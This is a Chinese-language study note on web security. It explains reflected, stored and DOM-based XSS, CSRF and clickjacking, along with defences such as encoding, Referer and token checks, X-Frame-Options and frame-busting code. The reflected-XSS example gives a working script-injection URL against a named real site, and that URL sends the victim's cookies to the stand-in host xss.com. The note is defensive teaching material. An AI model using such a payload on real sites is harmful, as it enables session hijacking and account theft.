[from](https://juejin.cn/post/6844903504369172494#heading-20)

# XSS 跨站脚本攻击



1. Reflected XSS（基于反射的XSS攻击）
   主要通过利用系统反馈行为漏洞，并欺骗用户主动触发，从而发起Web攻击。

   ```html
   http://you.163.com/search?keyword=<script>document.location='http://xss.com/get?cookie='+document.cookie</script>
   ```



   如果受骗的用户刚好已经登录过该网站，那么，用户的登录cookie信息就已经发到了攻击者的服务器（*xss.com*）了。当然，攻击者会做一些更过分的操作。



2. Stored XSS（基于存储的XSS攻击）

   Stored XSS和Reflected XSS的差别就在于，具有攻击性的脚本被保存到了服务器并且可以被普通用户完整的从服务的取得并执行，从而获得了在网络上传播的能力。

   ```你好！当你看到这段文字时，你的信息已经不安全了！<script>alert('xss')</script>```

   > tips：文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。
   > 此为题多从在于博客网站。



3. DOM-based or local XSS（基于DOM或本地的XSS攻击）

   DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。

   document.referer属性
   window.name属性
   location属性
   innerHTML属性
   documen.write属性
   ······

对于一切用户的输入、输出、客户端的输出内容视为不可信，在数据添加到DOM或者执行了DOM API的时候，我们需要对内容进行HtmlEncode或JavaScriptEncode，以预防XSS攻击。 https://www.cnblogs.com/lovesong/p/5211667.html



# CSRF 跨站请求伪造

> 跨站请求伪造 CSRF（Cross-site request forgery），也被称为“One Click Attack”或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS），但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险性。但往往同XSS一同作案！

1. 登录受信任网站A，并在本地生成Cookie。
2. 在不登出A的情况下，访问危险网站B。



1. 验证 HTTP Referer 字段；

   利用HTTP头中的Referer判断请求来源是否合法。

   优点：简单易行，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。

   缺点：
   1、Referer 的值是由浏览器提供的，不可全信，低版本浏览器下Referer存在伪造风险。
   2、用户自己可以设置浏览器使其在发送请求时不再提供 Referer时，网站将拒绝合法用户的访问。



2. 在请求地址中添加 token 并验证；

   在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中，以HTTP请求参数的形式加入一个随机产生的 token交由服务端验证

   优点：比检查 Referer 要安全一些，并且不涉及用户隐私。
   缺点：对所有请求都添加token比较困难，难以保证 token 本身的安全，依然会被利用获取到token



3. 在 HTTP 头中自定义属性并验证

   将token放到 HTTP 头中自定义的属性里。通过 XMLHttpRequest 的异步请求交由后端校验，并且一次有效。

   优点：统一管理token输入输出，可以保证token的安全性
   缺点：有局限性，无法在非异步的请求上实施

# 点击劫持

 	点击劫持，英文名clickjacking，也叫UI覆盖攻击，攻击者会利用一个或多个透明或不透明的层来诱骗用户支持点击按钮的操作，而实际的点击确实用户看不到的一个按钮，从而达到在用户不知情的情况下实施攻击。



防止点击劫持有两种主要方法：

### X-FRAME-OPTIONS

X-FRAME-OPTIONS是微软提出的一个http头，指示浏览器不允许从其他域进行取景，专门用来防御利用iframe嵌套的点击劫持攻击。并且在IE8、Firefox3.6、Chrome4以上的版本均能很好的支持。
这个头有三个值：
DENY // 拒绝任何域加载
SAMEORIGIN // 允许同源域下加载
ALLOW-FROM // 可以定义允许frame加载的页面地址

### 顶层判断

在UI中采用防御性代码，以确保当前帧是最顶层的窗口
方法有多中，如

```
top != self || top.location != self.location || top.location != location复制代码
```

有关Clickjacking防御的更多信息，请参阅[Clickjacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet).